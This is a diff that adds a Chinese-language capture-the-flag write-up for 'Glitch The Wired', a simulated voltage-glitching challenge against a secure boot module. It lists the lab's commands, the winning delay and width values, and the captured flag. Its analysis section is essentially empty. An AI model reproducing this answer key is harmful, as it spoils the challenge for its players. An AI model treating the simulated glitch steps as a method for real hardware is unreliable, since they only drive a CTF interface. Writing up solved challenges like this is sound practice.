@@ -180,6 +180,87 @@ FLAG: ESPILON{l41n_s3r14l_3xp_00}
 
 
 
+### Glitch The Wired
+
+#### 题目信息
+
+> ## Glitch The Wired
+>
+> ### 100
+>
+> hardware glitching fault-injection secure-boot Medium-Hard
+>
+> 
+>
+> **Glitch The Wired — Secure Boot Bypass**
+>
+> A WIRED-MED secure boot module is exposed on the lab bench. You have access to the power rail and can inject voltage glitches.
+>
+> - Glitch Lab: `tcp/<host>:3700`
+>
+> Find the right timing to bypass signature verification and access the debug console.
+>
+> Format: `ESPILON{...}`
+
+#### 解题过程
+
+**测试连接**
+
+```shell
+nc espilon.net 41842
+```
+
+```shell
+[WIRED-MED] Glitch Lab v1.0
+[WIRED-MED] Target: Secure Boot Module
+[WIRED-MED] Type 'help' for commands
+```
+
+```shell
+help
+```
+
+```shell
+[GLITCH LAB] WIRED-MED Fault Injection Interface
+Commands:
+  help          Show this help
+  status        Show current glitch parameters
+  observe       View boot sequence trace with cycle timings
+  set_delay N   Set glitch delay (cycles before trigger)
+  set_width N   Set glitch pulse width (cycles)
+  arm           Arm the glitch module
+  trigger       Fire the glitch and observe boot
+  read_console  Read debug console (after successful glitch)
+```
+
+**分析**
+
+- 故障机
+
+#### 题目答案
+
+**最终指令**
+
+```shell
+set_delay 3200
+set_width 20
+arm
+trigger
+read_console
+```
+
+```shell
+[WIRED-MED DEBUG CONSOLE]
+Firmware: v2.3-unsigned
+Boot: INSECURE (sig_verify skipped)
+Maintenance token: ESPILON{gl1tch_byp4ss_s3cur3_b00t}
+[END]
+```
+
+**得到：ESPILON{gl1tch_byp4ss_s3cur3_b00t}**
+
+
+
 # 队伍
 
 ## 名称
